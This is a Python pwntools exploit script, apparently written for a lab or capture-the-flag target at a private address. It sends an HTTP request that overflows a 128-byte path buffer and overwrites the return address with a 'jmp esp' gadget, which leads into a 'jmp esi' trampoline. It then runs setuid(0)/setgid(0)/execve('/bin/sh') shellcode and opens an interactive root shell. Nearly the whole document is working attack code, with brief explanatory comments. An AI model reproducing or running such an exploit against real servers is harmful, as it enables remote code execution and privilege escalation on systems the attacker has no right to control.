

from pwn import *

# Approach:
# Once we do the buffer overflow and jump to our address of choice, we notice that:
# - $esi contains the address of our shellcode, but no gadgets "jmp esi" or "call esi" or "mov eax, esi" exist in the .text section
# - There is a gadget "jmp esp" and we can control the content of $esp, thus controling the next instruction to be executed
#   We insert the instruction "jmp esi" as the next instruction to be executed
# 
# So, with by using the buffer overflow we execute the following instructions:
#   ret
#   jmp esp
#   jmp esi
#   <shellcode>

# context.log_level = logging.DEBUG
conn = remote('192.168.59.131', 20001)

resolved_sz = 128 # "resolved" buffer size in Bytes
jmp_esp__gadget = 0x08049f4f # 0x08049f4f: jmp esp;

path = (
    b'/'                +   #realpath will write '/' as first character
    b'A'*(resolved_sz-1)+
    b'A'*8              +   # padding until we reach old ebp
    b'B'*4              +   # old ebp
    pack(jmp_esp__gadget, 32, 'little', False)  +   # return address after fix_path()
    (   # contents of memory pointed by $esp once we return from fix_path()
        b'\xff\xe6'         +   # jmp esi
        b'\xCC\xCC'             # 2x int3, just to fill the word
    )
)
shellcode = (
#    b'\xCC' +  # Just for debugging

    # http://shell-storm.org/shellcode/files/shellcode-827.php
    # Linux/x86 execve /bin/sh shellcode 23 bytes
    # We choose execve() since it is already present in the .plt section
    # b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

    # http://shell-storm.org/shellcode/files/shellcode-251.php
    # Linux/x86 - setuid(0) setgid(0) execve("/bin/sh", ["/bin/sh", NULL]) - 37 bytes 
    b'\x6a\x17'    + # push $0x17
    b'\x58'        + # pop  %eax
    b'\x31\xdb'    + # xor %ebx, %ebx
    b'\xcd\x80'    + # int $0x80

    b'\x6a\x2e'    + # push $0x2e 
    b'\x58'        + # pop %eax
    b'\x53'        + # push %ebx
    b'\xcd\x80'    + # int $0x80

    b'\x31\xd2'    + # xor %edx, %edx
    b'\x6a\x0b'    + # push $0xb
    b'\x58'        + # pop %eax
    b'\x52'        + # push %edx
    b'\x68\x2f\x2f\x73\x68'    # push $0x68732f2f
    b'\x68\x2f\x62\x69\x6e'    # push $0x6e69622f
    b'\x89\xe3'    + # mov %esp, %ebx
    b'\x52'        + # push %edx
    b'\x53'        + # push %ebx
    b'\x89\xe1'    + # mov %esp, %ecx
    b'\xcd\x80'      # int $0x80
)
payload = b'GET ' + path + b' HTTP/1.1' + shellcode
conn.send(payload)

conn.interactive()
